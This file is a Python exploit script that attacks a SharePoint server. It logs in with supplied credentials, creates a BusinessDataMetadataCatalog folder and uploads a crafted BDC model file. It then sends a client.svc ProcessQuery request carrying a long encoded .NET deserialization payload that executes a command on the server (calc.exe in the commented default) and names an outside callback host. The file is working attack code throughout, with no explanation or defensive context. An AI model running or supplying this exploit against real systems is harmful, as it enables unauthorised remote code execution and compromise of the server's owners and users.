# -*- coding: utf-8 -*-

import requests
from requests_ntlm2 import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning
# from urllib import quote_plus
import sys, time
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

session = requests.session()
target1 = sys.argv[1]
username = sys.argv[2]
pwd = sys.argv[3]
# cmd = sys.argv[4]
# username = "spuser"
# pwd = "Abcd@@1234"
site = "/my/personal/" + username
target = target1 + site
# cmd = "calc.exe"

print("Target: " + target1)

digest = ""
auth = HttpNtlmAuth('%s' % (username), 
                        pwd)
# auth = {}
PROXY = {}
burp0_url = target1 + "/_api/web/"
burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}

content = session.get(burp0_url, headers=burp0_headers,  auth=auth, verify=False)

if content.status_code == 401:
    print("User is not site owner or wrong creds!")
    burp0_url = target1 + "/my/"
    burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}

    content = session.get(burp0_url, headers=burp0_headers,  auth=auth, verify=False, proxies=PROXY)

    print(content.status_code)

    if content.status_code == 401:
        print("Wrong credentials!")
        exit()
else:
    target = target1
    site = ""


time.sleep(5)
# need time to setup the personal site
burp0_url = target + "/_api/web/Folders"
burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}
burp0_json={"__metadata": {"type": "SP.Folder"}, "ServerRelativeUrl": site + "/BusinessDataMetadataCatalog"}
content = session.post(burp0_url, headers=burp0_headers, json=burp0_json, auth=auth, verify=False, proxies=PROXY)

if content.status_code == 401:
    print("Wrong credentials!")
    exit()

print(burp0_url)
digest = content.headers['X-RequestDigest']

#Create BusinessDataMetadataCatalog folder
burp0_url = target + "/_api/web/Folders"
burp0_headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Cache-Control": "max-age=0", "X-RequestDigest": digest, "Upgrade-Insecure-Requests": "1", "Accept": "application/json;odata=verbose", "Content-Type": "application/json;odata=verbose"}
burp0_json={"__metadata": {"type": "SP.Folder"}, "ServerRelativeUrl": site + "/BusinessDataMetadataCatalog"}
content = session.post(burp0_url, headers=burp0_headers, json=burp0_json, auth=auth, verify=False, proxies=PROXY)
# print(content.content)
if content.status_code != 201:
    
    print("Error while creating folder, folder may be existed")

#create bdcm file
burp0_url = target + "/_api/web/GetFolderByServerRelativeUrl('"+site+"/BusinessDataMetadataCatalog/')/Files/add(url='"+site+"/BusinessDataMetadataCatalog/BDCMetadata.bdcm',overwrite=true)"

burp0_headers = {"Connection": "close", "X-RequestDigest": digest, "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "User-Agent": "python-requests/2.27.1", "Content-type": "application/x-www-form-urlencoded"}
burp0_data = """<?xml version="1.0" encoding="utf-8"?><Model xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" Name="BDCMetadata" xmlns="http://schemas.microsoft.com/windows/2007/BusinessDataCatalog"><LobSystems><LobSystem Name="QjtvWXFT" Type="DotNetAssembly"><Properties><Property Name="WsdlFetchUrl" Type="System.String">http://localhost:32843/SecurityTokenServiceApplication/securitytoken.svc?singleWsdl</Property><Property Name="Class" Type="System.String">RevertToSelf</Property></Properties><LobSystemInstances><LobSystemInstance Name="QjtvWXFT"></LobSystemInstance></LobSystemInstances><Entities><Entity Name="Products" DefaultDisplayName="Products" Namespace="ODataDemo" Version="1.0.0.0" EstimatedInstanceCount="2000"><Properties><Property Name="ExcludeFromOfflineClientForList" Type="System.String">False</Property>
<Property Name="Class" Type="System.String">Microsoft.SharePoint.Administration.SPClickthroughUsageDefinition, Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c</Property></Properties><Identifiers><Identifier Name="ID" TypeName="System.String" /></Identifiers><Methods><Method Name="ParseLogFileEntry" DefaultDisplayName="Create Product" IsStatic="false"><Parameters><Parameter Name="@ID" Direction="In"><TypeDescriptor Name="ID" DefaultDisplayName="ID" TypeName="System.String" CreatorField="true" IdentifierName="ID">
<DefaultValues>
<DefaultValue MethodInstanceName="CreateProduct" Type="System.String">xxxx</DefaultValue></DefaultValues>
</TypeDescriptor></Parameter>
<Parameter Name="@CreateProduct" Direction="Return"><TypeDescriptor Name="CreateProduct1" TypeName="System.Object"></TypeDescriptor></Parameter></Parameters><MethodInstances><MethodInstance Name="CreateProduct" Type="SpecificFinder" ReturnParameterName="@CreateProduct"><AccessControlList><AccessControlEntry Principal="STS|SecurityTokenService|http://sharepoint.microsoft.com/claims/2009/08/isauthenticated|true|http://www.w3.org/2001/XMLSchema#string"><Right BdcRight="Execute" /></AccessControlEntry></AccessControlList></MethodInstance></MethodInstances></Method></Methods></Entity></Entities></LobSystem></LobSystems></Model>"""
req = session.post(burp0_url, headers=burp0_headers, data=burp0_data,  auth=auth, verify=False, proxies=PROXY)
print(req.status_code)
#Trigger vuln


burp0_url = target + "/_vti_bin/client.svc/ProcessQuery"

burp0_headers = {"X-RequestDigest": digest, "Content-Type": "text/xml", "X-RequestForceAuthentication": "true", "Accept-Encoding": "gzip, deflate", "Expect": "100-continue"}
burp0_data = """<Request AddExpandoFieldTypeSuffix="true" SchemaVersion="15.0.0.0" LibraryVersion="16.0.0.0" ApplicationName=".NET Library" xmlns="http://schemas.microsoft.com/sharepoint/clientquery/2009"><Actions><ObjectPath Id="21" ObjectPathId="20" /><ObjectPath Id="23" ObjectPathId="22" /> <ObjectPath Id="25" ObjectPathId="24" /></Actions><ObjectPaths><Method Id="20" ParentId="7" Name="GetCreatorView"><Parameters>
<Parameter Type="String">CreateProduct</Parameter>
</Parameters></Method>
<Method Id="22" ParentId="20" Name="GetDefaultValues"><Parameters/>
</Method>
<Method Id="24" ParentId="7" Name="FindSpecific"><Parameters>
<Parameter ObjectPathId="19" >
</Parameter>
<Parameter Type="String">CreateProduct</Parameter>
<Parameter ObjectPathId="18" />
</Parameters></Method><Identity Id="7" Name="9ccba4bb-d3a8-4255-b87f-18e2d824b848|4da630b6-36c5-4f55-8e01-5cd40e96104d:entityfile:Products,ODataDemo" />
<Identity Id="17" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:notifcallback:avkldkm.c.ultr.cc,CurrentContext" />
<Identity Id="18" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:lsifile:QjtvWXFT,QjtvWXFT" />
<Identity Id="19" Name="d42d9b6b-28e0-4ae8-a7f5-6503d367c115|4da630b6-36c5-4f55-8e01-5cd40e96104d:identity:StB8AAA==eAAxAAkAeAAyAAkAeAAzAAkAeAA0AAkAeAA1AAkAeAA2AAkAeAA3AAkAeAA4AAkAeAA5AAkAeAAxADAACQB4ADEAMQAJAHgAMQAyAAkAQQBBAEUAQQBBAEEARAAvAC8ALwAvAC8AQQBRAEEAQQBBAEEAQQBBAEEAQQBBAE0AQQBnAEEAQQBBAEUAbABUAGUAWABOADAAWgBXADAAcwBJAEYAWgBsAGMAbgBOAHAAYgAyADQAOQBOAEMANAB3AEwAagBBAHUATQBDAHcAZwBRADMAVgBzAGQASABWAHkAWgBUADEAdQBaAFgAVgAwAGMAbQBGAHMATABDAEIAUQBkAFcASgBzAGEAVwBOAEwAWgBYAGwAVQBiADIAdABsAGIAagAxAGkATgB6AGQAaABOAFcATQAxAE4AagBFADUATQB6AFIAbABNAEQAZwA1AEIAUQBFAEEAQQBBAEMARQBBAFYATgA1AGMAMwBSAGwAYgBTADUARABiADIAeABzAFoAVwBOADAAYQBXADkAdQBjAHkANQBIAFoAVwA1AGwAYwBtAGwAagBMAGwATgB2AGMAbgBSAGwAWgBGAE4AbABkAEcAQQB4AFcAMQB0AFQAZQBYAE4AMABaAFcAMAB1AFUAMwBSAHkAYQBXADUAbgBMAEMAQgB0AGMAMgBOAHYAYwBtAHgAcABZAGkAdwBnAFYAbQBWAHkAYwAyAGwAdgBiAGoAMAAwAEwAagBBAHUATQBDADQAdwBMAEMAQgBEAGQAVwB4ADAAZABYAEoAbABQAFcANQBsAGQAWABSAHkAWQBXAHcAcwBJAEYAQgAxAFkAbQB4AHAAWQAwAHQAbABlAFYAUgB2AGEAMgBWAHUAUABXAEkAMwBOADIARQAxAFkAegBVADIATQBUAGsAegBOAEcAVQB3AE8ARABsAGQAWABRAFEAQQBBAEEAQQBGAFEAMgA5ADEAYgBuAFEASQBRADIAOQB0AGMARwBGAHkAWgBYAEkASABWAG0AVgB5AGMAMgBsAHYAYgBnAFYASgBkAEcAVgB0AGMAdwBBAEQAQQBBAFkASQBqAFEARgBUAGUAWABOADAAWgBXADAAdQBRADIAOQBzAGIARwBWAGoAZABHAGwAdgBiAG4ATQB1AFIAMgBWAHUAWgBYAEoAcABZAHkANQBEAGIAMgAxAHcAWQBYAEoAcABjADIAOQB1AFEAMgA5AHQAYwBHAEYAeQBaAFgASgBnAE0AVgB0AGIAVQAzAGwAegBkAEcAVgB0AEwAbABOADAAYwBtAGwAdQBaAHkAdwBnAGIAWABOAGoAYgAzAEoAcwBhAFcASQBzAEkARgBaAGwAYwBuAE4AcABiADIANAA5AE4AQwA0AHcATABqAEEAdQBNAEMAdwBnAFEAMwBWAHMAZABIAFYAeQBaAFQAMQB1AFoAWABWADAAYwBtAEYAcwBMAEMAQgBRAGQAVwBKAHMAYQBXAE4ATABaAFgAbABVAGIAMgB0AGwAYgBqADEAaQBOAHoAZABoAE4AVwBNADEATgBqAEUANQBNAHoAUgBsAE0ARABnADUAWABWADAASQBBAGcAQQBBAEEAQQBJAEEAQQBBAEEASgBBAHcAQQBBAEEAQQBJAEEAQQBBAEEASgBCAEEAQQBBAEEAQQBRAEQAQQBBAEEAQQBqAFEARgBUAGUAWABOADAAWgBXADAAdQBRADIAOQBzAGIARwBWAGoAZABHAGwAdgBiAG4ATQB1AFIAMgBWAHUAWgBYAEoAcABZAHkANQBEAGIAMgAxAHcAWQBYAEoAcABjADIAOQB1AFEAMgA5AHQAYwBHAEYAeQBaAFgASgBnAE0AVgB0AGIAVQAzAGwAegBkAEcAVgB0AEwAbABOADAAYwBtAGwAdQBaAHkAdwBnAGIAWABOAGoAYgAzAEoAcwBhAFcASQBzAEkARgBaAGwAYwBuAE4AcABiADIANAA5AE4AQwA0AHcATABqAEEAdQBNAEMAdwBnAFEAMwBWAHMAZABIAFYAeQBaAFQAMQB1AFoAWABWADAAYwBtAEYAcwBMAEMAQgBRAGQAVwBKAHMAYQBXAE4ATABaAFgAbABVAGIAMgB0AGwAYgBqADEAaQBOAHoAZABoAE4AVwBNADEATgBqAEUANQBNAHoAUgBsAE0ARABnADUAWABWADAAQgBBAEEAQQBBAEMAMQA5AGoAYgAyADEAdwBZAFgASgBwAGMAMgA5AHUAQQB5AEoAVABlAFgATgAwAFoAVwAwAHUAUgBHAFYAcwBaAFcAZABoAGQARwBWAFQAWgBYAEoAcABZAFcAeABwAGUAbQBGADAAYQBXADkAdQBTAEcAOQBzAFoARwBWAHkAQwBRAFUAQQBBAEEAQQBSAEIAQQBBAEEAQQBBAEkAQQBBAEEAQQBHAEIAZwBBAEEAQQBBAHMAdgBZAHkAQgBqAFkAVwB4AGoATABtAFYANABaAFEAWQBIAEEAQQBBAEEAQQAyAE4AdABaAEEAUQBGAEEAQQBBAEEASQBsAE4ANQBjADMAUgBsAGIAUwA1AEUAWgBXAHgAbABaADIARgAwAFoAVgBOAGwAYwBtAGwAaABiAEcAbAA2AFkAWABSAHAAYgAyADUASQBiADIAeABrAFoAWABJAEQAQQBBAEEAQQBDAEUAUgBsAGIARwBWAG4AWQBYAFIAbABCADIAMQBsAGQARwBoAHYAWgBEAEEASABiAFcAVgAwAGEARwA5AGsATQBRAE0ARABBAHoAQgBUAGUAWABOADAAWgBXADAAdQBSAEcAVgBzAFoAVwBkAGgAZABHAFYAVABaAFgASgBwAFkAVwB4AHAAZQBtAEYAMABhAFcAOQB1AFMARwA5AHMAWgBHAFYAeQBLADAAUgBsAGIARwBWAG4AWQBYAFIAbABSAFcANQAwAGMAbgBrAHYAVQAzAGwAegBkAEcAVgB0AEwAbABKAGwAWgBtAHgAbABZADMAUgBwAGIAMgA0AHUAVABXAFYAdABZAG0AVgB5AFMAVwA1AG0AYgAxAE4AbABjAG0AbABoAGIARwBsADYAWQBYAFIAcABiADIANQBJAGIAMgB4AGsAWgBYAEkAdgBVADMAbAB6AGQARwBWAHQATABsAEoAbABaAG0AeABsAFkAMwBSAHAAYgAyADQAdQBUAFcAVgB0AFkAbQBWAHkAUwBXADUAbQBiADEATgBsAGMAbQBsAGgAYgBHAGwANgBZAFgAUgBwAGIAMgA1AEkAYgAyAHgAawBaAFgASQBKAEMAQQBBAEEAQQBBAGsASgBBAEEAQQBBAEMAUQBvAEEAQQBBAEEARQBDAEEAQQBBAEEARABCAFQAZQBYAE4AMABaAFcAMAB1AFIARwBWAHMAWgBXAGQAaABkAEcAVgBUAFoAWABKAHAAWQBXAHgAcABlAG0ARgAwAGEAVwA5AHUAUwBHADkAcwBaAEcAVgB5AEsAMABSAGwAYgBHAFYAbgBZAFgAUgBsAFIAVwA1ADAAYwBuAGsASABBAEEAQQBBAEIASABSADUAYwBHAFUASQBZAFgATgB6AFoAVwAxAGkAYgBIAGsARwBkAEcARgB5AFoAMgBWADAARQBuAFIAaABjAG0AZABsAGQARgBSADUAYwBHAFYAQgBjADMATgBsAGIAVwBKAHMAZQBRADUAMABZAFgASgBuAFoAWABSAFUAZQBYAEIAbABUAG0ARgB0AFoAUQBwAHQAWgBYAFIAbwBiADIAUgBPAFkAVwAxAGwARABXAFIAbABiAEcAVgBuAFkAWABSAGwAUgBXADUAMABjAG4AawBCAEEAUQBJAEIAQQBRAEUARABNAEYATgA1AGMAMwBSAGwAYgBTADUARQBaAFcAeABsAFoAMgBGADAAWgBWAE4AbABjAG0AbABoAGIARwBsADYAWQBYAFIAcABiADIANQBJAGIAMgB4AGsAWgBYAEkAcgBSAEcAVgBzAFoAVwBkAGgAZABHAFYARgBiAG4AUgB5AGUAUQBZAEwAQQBBAEEAQQBzAEEASgBUAGUAWABOADAAWgBXADAAdQBSAG4AVgB1AFkAMgBBAHoAVwAxAHQAVABlAFgATgAwAFoAVwAwAHUAVQAzAFIAeQBhAFcANQBuAEwAQwBCAHQAYwAyAE4AdgBjAG0AeABwAFkAaQB3AGcAVgBtAFYAeQBjADIAbAB2AGIAagAwADAATABqAEEAdQBNAEMANAB3AEwAQwBCAEQAZABXAHgAMABkAFgASgBsAFAAVwA1AGwAZABYAFIAeQBZAFcAdwBzAEkARgBCADEAWQBtAHgAcABZADAAdABsAGUAVgBSAHYAYQAyAFYAdQBQAFcASQAzAE4AMgBFADEAWQB6AFUAMgBNAFQAawB6AE4ARwBVAHcATwBEAGwAZABMAEYAdABUAGUAWABOADAAWgBXADAAdQBVADMAUgB5AGEAVwA1AG4ATABDAEIAdABjADIATgB2AGMAbQB4AHAAWQBpAHcAZwBWAG0AVgB5AGMAMgBsAHYAYgBqADAAMABMAGoAQQB1AE0AQwA0AHcATABDAEIARABkAFcAeAAwAGQAWABKAGwAUABXADUAbABkAFgAUgB5AFkAVwB3AHMASQBGAEIAMQBZAG0AeABwAFkAMAB0AGwAZQBWAFIAdgBhADIAVgB1AFAAVwBJADMATgAyAEUAMQBZAHoAVQAyAE0AVABrAHoATgBHAFUAdwBPAEQAbABkAEwARgB0AFQAZQBYAE4AMABaAFcAMAB1AFIARwBsAGgAWgAyADUAdgBjADMAUgBwAFkAMwBNAHUAVQBIAEoAdgBZADIAVgB6AGMAeQB3AGcAVQAzAGwAegBkAEcAVgB0AEwAQwBCAFcAWgBYAEoAegBhAFcAOQB1AFAAVABRAHUATQBDADQAdwBMAGoAQQBzAEkARQBOADEAYgBIAFIAMQBjAG0AVQA5AGIAbQBWADEAZABIAEoAaABiAEMAdwBnAFUASABWAGkAYgBHAGwAagBTADIAVgA1AFYARwA5AHIAWgBXADQAOQBZAGoAYwAzAFkAVABWAGoATgBUAFkAeABPAFQATQAwAFoAVABBADQATwBWADEAZABCAGcAdwBBAEEAQQBCAEwAYgBYAE4AagBiADMASgBzAGEAVwBJAHMASQBGAFoAbABjAG4ATgBwAGIAMgA0ADkATgBDADQAdwBMAGoAQQB1AE0AQwB3AGcAUQAzAFYAcwBkAEgAVgB5AFoAVAAxAHUAWgBYAFYAMABjAG0ARgBzAEwAQwBCAFEAZABXAEoAcwBhAFcATgBMAFoAWABsAFUAYgAyAHQAbABiAGoAMQBpAE4AegBkAGgATgBXAE0AMQBOAGoARQA1AE0AegBSAGwATQBEAGcANQBDAGcAWQBOAEEAQQBBAEEAUwBWAE4ANQBjADMAUgBsAGIAUwB3AGcAVgBtAFYAeQBjADIAbAB2AGIAagAwADAATABqAEEAdQBNAEMANAB3AEwAQwBCAEQAZABXAHgAMABkAFgASgBsAFAAVwA1AGwAZABYAFIAeQBZAFcAdwBzAEkARgBCADEAWQBtAHgAcABZADAAdABsAGUAVgBSAHYAYQAyAFYAdQBQAFcASQAzAE4AMgBFADEAWQB6AFUAMgBNAFQAawB6AE4ARwBVAHcATwBEAGsARwBEAGcAQQBBAEEAQgBwAFQAZQBYAE4AMABaAFcAMAB1AFIARwBsAGgAWgAyADUAdgBjADMAUgBwAFkAMwBNAHUAVQBIAEoAdgBZADIAVgB6AGMAdwBZAFAAQQBBAEEAQQBCAFYATgAwAFkAWABKADAAQwBSAEEAQQBBAEEAQQBFAEMAUQBBAEEAQQBDADkAVABlAFgATgAwAFoAVwAwAHUAVQBtAFYAbQBiAEcAVgBqAGQARwBsAHYAYgBpADUATgBaAFcAMQBpAFoAWABKAEoAYgBtAFoAdgBVADIAVgB5AGEAVwBGAHMAYQBYAHAAaABkAEcAbAB2AGIAawBoAHYAYgBHAFIAbABjAGcAYwBBAEEAQQBBAEUAVABtAEYAdABaAFEAeABCAGMAMwBOAGwAYgBXAEoAcwBlAFUANQBoAGIAVwBVAEoAUQAyAHgAaABjADMATgBPAFkAVwAxAGwAQwBWAE4AcABaADIANQBoAGQASABWAHkAWgBRAHAAVABhAFcAZAB1AFkAWABSADEAYwBtAFUAeQBDAGsAMQBsAGIAVwBKAGwAYwBsAFIANQBjAEcAVQBRAFIAMgBWAHUAWgBYAEoAcABZADAARgB5AFoAMwBWAHQAWgBXADUAMABjAHcARQBCAEEAUQBFAEIAQQBBAE0ASQBEAFYATgA1AGMAMwBSAGwAYgBTADUAVQBlAFgAQgBsAFcAMQAwAEoARAB3AEEAQQBBAEEAawBOAEEAQQBBAEEAQwBRADQAQQBBAEEAQQBHAEYAQQBBAEEAQQBEADUAVABlAFgATgAwAFoAVwAwAHUAUgBHAGwAaABaADIANQB2AGMAMwBSAHAAWQAzAE0AdQBVAEgASgB2AFkAMgBWAHoAYwB5AEIAVABkAEcARgB5AGQAQwBoAFQAZQBYAE4AMABaAFcAMAB1AFUAMwBSAHkAYQBXADUAbgBMAEMAQgBUAGUAWABOADAAWgBXADAAdQBVADMAUgB5AGEAVwA1AG4ASwBRAFkAVgBBAEEAQQBBAFAAbABOADUAYwAzAFIAbABiAFMANQBFAGEAVwBGAG4AYgBtADkAegBkAEcAbABqAGMAeQA1AFEAYwBtADkAagBaAFgATgB6AEkARgBOADAAWQBYAEoAMABLAEYATgA1AGMAMwBSAGwAYgBTADUAVABkAEgASgBwAGIAbQBjAHMASQBGAE4ANQBjADMAUgBsAGIAUwA1AFQAZABIAEoAcABiAG0AYwBwAEMAQQBBAEEAQQBBAG8AQgBDAGcAQQBBAEEAQQBrAEEAQQBBAEEARwBGAGcAQQBBAEEAQQBkAEQAYgAyADEAdwBZAFgASgBsAEMAUQB3AEEAQQBBAEEARwBHAEEAQQBBAEEAQQAxAFQAZQBYAE4AMABaAFcAMAB1AFUAMwBSAHkAYQBXADUAbgBCAGgAawBBAEEAQQBBAHIAUwBXADUAMABNAHoASQBnAFEAMgA5AHQAYwBHAEYAeQBaAFMAaABUAGUAWABOADAAWgBXADAAdQBVADMAUgB5AGEAVwA1AG4ATABDAEIAVABlAFgATgAwAFoAVwAwAHUAVQAzAFIAeQBhAFcANQBuAEsAUQBZAGEAQQBBAEEAQQBNAGwATgA1AGMAMwBSAGwAYgBTADUASgBiAG4AUQB6AE0AaQBCAEQAYgAyADEAdwBZAFgASgBsAEsARgBOADUAYwAzAFIAbABiAFMANQBUAGQASABKAHAAYgBtAGMAcwBJAEYATgA1AGMAMwBSAGwAYgBTADUAVABkAEgASgBwAGIAbQBjAHAAQwBBAEEAQQBBAEEAbwBCAEUAQQBBAEEAQQBBAGcAQQBBAEEAQQBHAEcAdwBBAEEAQQBIAEYAVABlAFgATgAwAFoAVwAwAHUAUQAyADkAdABjAEcARgB5AGEAWABOAHYAYgBtAEEAeABXADEAdABUAGUAWABOADAAWgBXADAAdQBVADMAUgB5AGEAVwA1AG4ATABDAEIAdABjADIATgB2AGMAbQB4AHAAWQBpAHcAZwBWAG0AVgB5AGMAMgBsAHYAYgBqADAAMABMAGoAQQB1AE0AQwA0AHcATABDAEIARABkAFcAeAAwAGQAWABKAGwAUABXADUAbABkAFgAUgB5AFkAVwB3AHMASQBGAEIAMQBZAG0AeABwAFkAMAB0AGwAZQBWAFIAdgBhADIAVgB1AFAAVwBJADMATgAyAEUAMQBZAHoAVQAyAE0AVABrAHoATgBHAFUAdwBPAEQAbABkAFgAUQBrAE0AQQBBAEEAQQBDAGcAawBNAEEAQQBBAEEAQwBSAGcAQQBBAEEAQQBKAEYAZwBBAEEAQQBBAG8ATAAJAHgAMQA0AAkAeAAxADUACQB4ADEANgA=" /></ObjectPaths></Request>"""
req = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=PROXY)


print("Done!")